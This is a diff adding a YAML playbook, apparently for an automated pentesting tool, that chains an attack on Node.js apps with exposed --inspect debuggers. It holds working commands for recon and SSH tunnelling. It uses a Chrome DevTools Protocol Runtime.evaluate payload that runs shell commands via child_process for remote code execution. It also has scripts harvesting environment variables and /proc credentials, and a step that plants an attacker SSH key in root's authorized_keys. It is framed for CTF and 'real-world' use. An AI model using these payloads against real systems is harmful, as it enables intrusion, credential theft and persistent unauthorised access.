@@ -1,0 +1,278 @@
+name: "Node.js Debugger (CDP) Security Exploitation"
+description: >
+  Complete exploitation chain for Node.js applications with exposed --inspect
+  debuggers via Chrome DevTools Protocol (CDP) WebSocket. Covers discovery,
+  WebSocket connection, Runtime.evaluate for RCE, credential harvesting, and
+  privilege escalation. Designed for CTF, HTB, and real-world Node.js assessments.
+version: "2.0"
+target_required: true
+vars:
+  ssh_user: ""
+  ssh_key_path: ""
+  web_port: "3000"
+  debug_port: "9229"
+vars_description:
+  ssh_user: "Username for SSH access (if obtained)"
+  ssh_key_path: "Path to SSH private key for tunneling"
+  web_port: "Port of the Node.js web application"
+  debug_port: "Port of the Node.js --inspect debugger"
+preflight:
+  name: preflight_check
+  description: "Verify connectivity to the target"
+  steps:
+    - name: connectivity_check
+      description: "Check target connectivity and open ports"
+      command: >
+        ping -c 1 -W 3 "{target}" 2>&1 | head -2;
+        echo "--- Port scan ---";
+        for p in {web_port} {debug_port} 22; do
+          timeout 3 bash -c "echo >/dev/tcp/{target}/\$p" 2>/dev/null && echo "Port \$p: OPEN" || echo "Port \$p: closed";
+        done
+steps:
+  - name: preamble
+    description: "Create output directories"
+    command: >
+      mkdir -p "{case_dir}/recon" "{case_dir}/exploit" "{case_dir}/loot" "{case_dir}/report"{newline}
+      echo "Directories ready" > "{case_dir}/preamble.txt"
+  - name: web_recon
+    description: "Fingerprint Node.js web application (Next.js, Express, etc.)"
+    command: >
+      echo "=== Web application recon ===" > "{case_dir}/recon/web_recon.txt{newline}"
+      echo "--- HTTP headers ---" >> "{case_dir}/recon/web_recon.txt";
+      curl -skI "https://{target}:{web_port}" 2>&1 >> "{case_dir}/recon/web_recon.txt";
+      curl -skI "http://{target}:{web_port}" 2>&1 >> "{case_dir}/recon/web_recon.txt";
+      echo "" >> "{case_dir}/recon/web_recon.txt";
+      echo "--- Technology detection ---" >> "{case_dir}/recon/web_recon.txt";
+      whatweb "http://{target}:{web_port}" 2>&1 >> "{case_dir}/recon/web_recon.txt";
+      echo "" >> "{case_dir}/recon/web_recon.txt";
+      echo "--- JavaScript analysis ---" >> "{case_dir}/recon/web_recon.txt";
+      curl -sk "http://{target}:{web_port}" 2>/dev/null | grep -oP 'src="[^"]*\.js"' | while read js; do
+        url=$(echo "$js" | grep -oP '"[^"]+"' | tr -d '"');
+        curl -sk "http://{target}:{web_port}$url" 2>/dev/null > "/tmp/js_$(basename $url)";
+        strings "/tmp/js_$(basename $url)" | grep -iE "(supabase|firebase|api_key|token|jwt|secret|password|debug|inspect|--inspect|9229|9230)" | head -20 >> "{case_dir}/recon/web_recon.txt";
+      done;
+      echo "" >> "{case_dir}/recon/web_recon.txt";
+      echo "--- API endpoints ---" >> "{case_dir}/recon/web_recon.txt";
+      curl -sk "http://{target}:{web_port}" 2>/dev/null | grep -oP '(href|action|src)="[^"]+"' | head -30 >> "{case_dir}/recon/web_recon.txt"
+  - name: rce_surface_scan
+    description: "Scan for RCE vulnerabilities in the web application"
+    command: >
+      echo "=== RCE surface scan ===" > "{case_dir}/recon/rce_scan.txt{newline}"
+      echo "Common Node.js RCE vectors:" >> "{case_dir}/recon/rce_scan.txt";
+      echo "1. Next.js middleware bypass (CVE-2025-55182)" >> "{case_dir}/recon/rce_scan.txt";
+      echo "2. Deserialization in express-session" >> "{case_dir}/recon/rce_scan.txt";
+      echo "3. SSTI in template engines (EJS, Pug, Handlebars)" >> "{case_dir}/recon/rce_scan.txt";
+      echo "4. SSRF to internal services" >> "{case_dir}/recon/rce_scan.txt";
+      echo "5. Prototype pollution" >> "{case_dir}/recon/rce_scan.txt";
+      echo "6. Path traversal to read source code" >> "{case_dir}/recon/rce_scan.txt";
+      echo "" >> "{case_dir}/recon/rce_scan.txt";
+      echo "--- Nuclei scan ---" >> "{case_dir}/recon/rce_scan.txt";
+      nuclei -u "http://{target}:{web_port}" -tags "rce,nodejs,express,nextjs" -severity critical,high -jsonl -o "{case_dir}/recon/nuclei_rce.json" -c 10 -rl 100 2>&1 | tail -5 >> "{case_dir}/recon/rce_scan.txt"
+  - name: debug_port_discovery
+    description: "Discover Node.js --inspect debugger port (default 9229)"
+    command: >
+      echo "=== Node.js debug port discovery ===" > "{case_dir}/recon/debug_discovery.txt{newline}"
+      echo "--- Target port scan ---" >> "{case_dir}/recon/debug_discovery.txt";
+      for port in 9229 9230 9231 9222 9233 5858; do
+        timeout 2 bash -c "echo >/dev/tcp/{target}/\$port" 2>/dev/null &&
+          echo "Port \$port: OPEN (Node.js debugger?)" >> "{case_dir}/recon/debug_discovery.txt" ||
+          echo "Port \$port: closed" >> "{case_dir}/recon/debug_discovery.txt";
+      done;
+      echo "" >> "{case_dir}/recon/debug_discovery.txt";
+      echo "--- Process list check (if SSH access) ---" >> "{case_dir}/recon/debug_discovery.txt";
+      if [ -n "{ssh_user}" ]; then
+        ssh -o StrictHostKeyChecking=no -i "{ssh_key_path}" "{ssh_user}@{target}" \
+          "ps aux | grep -E '(node|npm|next|--inspect)' | grep -v grep" 2>/dev/null >> "{case_dir}/recon/debug_discovery.txt";
+      fi;
+      echo "" >> "{case_dir}/recon/debug_discovery.txt";
+      echo "--- Check for CDP WebSocket ---" >> "{case_dir}/recon/debug_discovery.txt";
+      curl -sk "http://{target}:{debug_port}/json/version" 2>&1 | head -20 >> "{case_dir}/recon/debug_discovery.txt";
+      if [ -s "{case_dir}/recon/debug_discovery.txt" ]; then
+        echo "--- /json/list (all targets) ---" >> "{case_dir}/recon/debug_discovery.txt";
+        curl -sk "http://{target}:{debug_port}/json/list" 2>&1 >> "{case_dir}/recon/debug_discovery.txt";
+      fi
+  - name: ssh_tunnel_setup
+    description: "Setup SSH tunnel to forward debug port to local machine"
+    command: >
+      echo "=== SSH tunnel setup ===" > "{case_dir}/exploit/tunnel_setup.txt{newline}"
+      if [ -n "{ssh_user}" ]; then
+        echo "Setting up SSH tunnel: localhost:{debug_port} -> {target}:{debug_port}" >> "{case_dir}/exploit/tunnel_setup.txt";
+        ssh -o StrictHostKeyChecking=no -i "{ssh_key_path}" -L "{debug_port}:127.0.0.1:{debug_port}" \
+          "{ssh_user}@{target}" -N -f 2>&1 >> "{case_dir}/exploit/tunnel_setup.txt";
+        echo "Tunnel PID: $!" >> "{case_dir}/exploit/tunnel_setup.txt";
+        sleep 1;
+        curl -sk "http://127.0.0.1:{debug_port}/json/version" 2>&1 >> "{case_dir}/exploit/tunnel_setup.txt";
+      else
+        echo "No SSH user specified. Try direct connection to port {debug_port}." >> "{case_dir}/exploit/tunnel_setup.txt";
+        curl -sk "http://{target}:{debug_port}/json/version" 2>&1 >> "{case_dir}/exploit/tunnel_setup.txt";
+      fi
+  - name: cdp_websocket_check
+    description: "Connect to CDP WebSocket and verify execution capability"
+    command: >
+      echo "=== CDP WebSocket exploitation ===" > "{case_dir}/exploit/cdp_exploit.txt{newline}"
+      echo "Using wsUrl from /json/list" >> "{case_dir}/exploit/cdp_exploit.txt";
+      echo "" >> "{case_dir}/exploit/cdp_exploit.txt";
+      python3 -c "
+import json, sys, os, struct, socket, base64, hashlib, re
+
+def test_cdp(host, port):
+    try:
+        # Get WebSocket URL
+        import urllib.request
+        resp = urllib.request.urlopen(f'http://{host}:{port}/json/list', timeout=10)
+        targets = json.loads(resp.read())
+        if not targets:
+            resp2 = urllib.request.urlopen(f'http://{host}:{port}/json/version', timeout=10)
+            print(f'WebSocket URL: {json.loads(resp2.read()).get(\"webSocketDebuggerUrl\",\"unknown\")}')
+            return
+        for t in targets:
+            ws_url = t.get('webSocketDebuggerUrl','')
+            title = t.get('title','')
+            url = t.get('url','')
+            print(f'Target: {title}')
+            print(f'  URL: {url}')
+            print(f'  WS: {ws_url}')
+    except Exception as e:
+        print(f'Connection failed: {e}')
+
+test_cdp('127.0.0.1' if os.system('curl -sk http://127.0.0.1:9229/json/version >/dev/null 2>&1') == 0 else '{target}', '{debug_port}')
+" 2>&1 >> "{case_dir}/exploit/cdp_exploit.txt"
+  - name: cdp_rce_execute
+    description: "Execute commands via CDP Runtime.evaluate for full RCE"
+    command: >
+      echo "=== CDP RCE execution ===" > "{case_dir}/exploit/cdp_rce.txt{newline}"
+      python3 -c "
+import json, urllib.request, sys, os
+
+def ws_connect(host, port, eval_js):
+    \"\"\"Establish CDP WebSocket connection and evaluate JavaScript.\"\"\"
+    try:
+        # Get WebSocket URL from /json/list
+        resp = urllib.request.urlopen(f'http://{host}:{port}/json/list', timeout=10)
+        targets = json.loads(resp.read())
+        ws_url = targets[0]['webSocketDebuggerUrl'] if targets else f'ws://{host}:{port}'
+        print(f'wsUrl: {ws_url}')
+    except Exception as e:
+        print(f'Error getting WS URL: {e}')
+        return
+
+    # Use websocat if available, otherwise guide user
+    import subprocess
+    try:
+        subprocess.run(['which','websocat'], capture_output=True, check=True)
+        cmd = f'echo \\'{{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":\"JSON.stringify(process.mainModule.require(\\\"child_process\\\").execSync(\\\"{eval_js}\\\").toString())\",\"returnByValue\":true}}}}\\' | websocat -n1 {ws_url}'
+        print(f'Running: {cmd[:150]}...')
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        if result.returncode == 0:
+            print(f'Result: {result.stdout[:500]}')
+        else:
+            print(f'Error: {result.stderr[:500]}')
+            print('Try manual: websocat {ws_url}')
+            print(f'Send: {{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":\"1+1\",\"returnByValue\":true}}}}')
+    except:
+        print(f'websocat not found.')
+        print(f'Try manual CDP connection:')
+        print(f'1. Install websocat or use Python websocket-client')
+        print(f'2. Connect to: {ws_url}')
+        print(f'3. Send: {{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":\"1+1\"}}}}')
+
+ws_connect('127.0.0.1', {debug_port}, 'cat /root/root.txt')
+" 2>&1 >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "=== Useful CDP commands ===" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "Runtime.evaluate - Execute JavaScript in Node.js context" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "Runtime.getProperties - List object properties" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "Runtime.globalLexicalScopeNames - List global variables" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "Debugger.setBreakpoint - Set breakpoints" >> "{case_dir}/exploit/cdp_rce.txt";
+      echo "Debugger.getScriptSource - Read source code" >> "{case_dir}/exploit/cdp_rce.txt"
+  - name: credential_harvest
+    description: "Harvest credentials from Node.js process via CDP"
+    command: >
+      echo "=== Credential harvesting via CDP ===" > "{case_dir}/loot/credential_harvest.txt{newline}"
+      python3 -c "
+import json, subprocess, sys, os
+
+harvest_scripts = {
+    'env_vars': 'JSON.stringify(process.env)',
+    'config_files': 'JSON.stringify(require(\"fs\").readdirSync(\"/\").filter(x => x.includes(\".env\") || x.includes(\"config\")))',
+    'proc_self_environ': 'JSON.stringify(require(\"fs\").readFileSync(\"/proc/self/environ\").toString())',
+    'cmdline': 'JSON.stringify(require(\"fs\").readFileSync(\"/proc/self/cmdline\").toString().split(\"\\\\0\"))',
+    'cwd_listing': 'JSON.stringify(require(\"fs\").readdirSync(\".\"))',
+    'home_dir': 'JSON.stringify(require(\"fs\").readdirSync(process.env.HOME || \"/root\"))',
+    'package_json': 'try{JSON.stringify(JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString()))}catch(e){\"no package.json\"}',
+}
+
+for name, js in harvest_scripts.items():
+    print(f'\\n=== {name} ===')
+    cmd = f'echo \\'{{\"id\":1,\"method\":\"Runtime.evaluate\",\"params\":{{\"expression\":{json.dumps(js)},\"returnByValue\":true}}}}\\' | websocat -n1 ws://127.0.0.1:{harvest_port} 2>/dev/null'
+    print(f'  Run: {name}')
+    print(f'  Script: {js[:100]}...')
+" 2>&1 >> "{case_dir}/loot/credential_harvest.txt";
+      echo "" >> "{case_dir}/loot/credential_harvest.txt";
+      echo "=== Environment variables dump ===" >> "{case_dir}/loot/credential_harvest.txt";
+      if [ -n "{ssh_user}" ]; then
+        ssh -o StrictHostKeyChecking=no -i "{ssh_key_path}" "{ssh_user}@{target}" \
+          "cat /proc/\$(pgrep -f 'node.*--inspect' | head -1)/environ 2>/dev/null | tr '\\\0' '\\\n'" \
+          2>/dev/null > "{case_dir}/loot/node_env.txt" && echo "Environment dumped" || echo "No node process found";
+      fi
+  - name: persistence_setup
+    description: "Establish persistence via SSH key or reverse shell"
+    command: >
+      echo "=== Persistence ===" > "{case_dir}/exploit/persistence.txt{newline}"
+      if [ -n "{ssh_user}" ]; then
+        echo "Adding attacker SSH key:" >> "{case_dir}/exploit/persistence.txt";
+        # Generate key
+        ssh-keygen -t ed25519 -f "{case_dir}/exploit/attacker_key" -N "" -q 2>/dev/null;
+        cat "{case_dir}/exploit/attacker_key.pub" >> "{case_dir}/exploit/persistence.txt";
+        echo "" >> "{case_dir}/exploit/persistence.txt";
+        echo "Add to root authorized_keys via CDP:" >> "{case_dir}/exploit/persistence.txt";
+        KEY=$(cat "{case_dir}/exploit/attacker_key.pub");
+        echo "Runtime.evaluate with:" >> "{case_dir}/exploit/persistence.txt";
+        echo "  require('fs').appendFileSync('/root/.ssh/authorized_keys', '\\\n$KEY')" >> "{case_dir}/exploit/persistence.txt";
+      fi
+  - name: flag_capture
+    description: "Capture user and root flags"
+    command: >
+      echo "=== Flag capture ===" > "{case_dir}/loot/flags.txt{newline}"
+      for f in "user.txt" "root.txt" "flag.txt" "flag" ".flag"; do
+        if [ -n "{ssh_user}" ]; then
+          RESULT=$(ssh -o StrictHostKeyChecking=no -i "{ssh_key_path}" "{ssh_user}@{target}" \
+            "find / -name '$f' -type f 2>/dev/null | head -5" 2>/dev/null);
+          if [ -n "$RESULT" ]; then
+            echo "--- $f found at: $RESULT ---" >> "{case_dir}/loot/flags.txt";
+            for fp in $RESULT; do
+              ssh -o StrictHostKeyChecking=no -i "{ssh_key_path}" "{ssh_user}@{target}" \
+                "cat $fp" 2>/dev/null >> "{case_dir}/loot/flags.txt";
+            done;
+          fi;
+        fi;
+      done
+  - name: compile_report
+    description: "Compile full exploit chain report"
+    command: >
+      echo "# Node.js Debugger (CDP) Exploitation Report" > "{case_dir}/report/exploit_report.md{newline}"
+      echo "Target: {target}" >> "{case_dir}/report/exploit_report.md";
+      echo "Date: $(date -u)" >> "{case_dir}/report/exploit_report.md";
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 1. Reconnaissance" >> "{case_dir}/report/exploit_report.md";
+      grep -E "Next\.js|Express|Node|Angular|React" "{case_dir}/recon/web_recon.txt" 2>/dev/null | head -3 >> "{case_dir}/report/exploit_report.md";
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 2. Debug Port Discovery" >> "{case_dir}/report/exploit_report.md";
+      if grep -q OPEN "{case_dir}/recon/debug_discovery.txt" 2>/dev/null; then
+        echo "- **Debug port discovered**" >> "{case_dir}/report/exploit_report.md";
+        grep "OPEN" "{case_dir}/recon/debug_discovery.txt" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 3. CDP Exploitation" >> "{case_dir}/report/exploit_report.md";
+      if grep -q Runtime.evaluate "{case_dir}/exploit/cdp_rce.txt" 2>/dev/null; then
+        echo "- CDP RCE executed via Runtime.evaluate" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 4. Flags Captured" >> "{case_dir}/report/exploit_report.md";
+      cat "{case_dir}/loot/flags.txt" 2>/dev/null >> "{case_dir}/report/exploit_report.md"
+postflight:
+  - name: cleanup
+    description: "Kill SSH tunnels and clean up"
+    command: >
+      pkill -f "ssh.*-L.*{debug_port}:127.0.0.1:{debug_port}" 2>/dev/null;
+      echo "Cleanup done" > "{case_dir}/cleanup.txt"
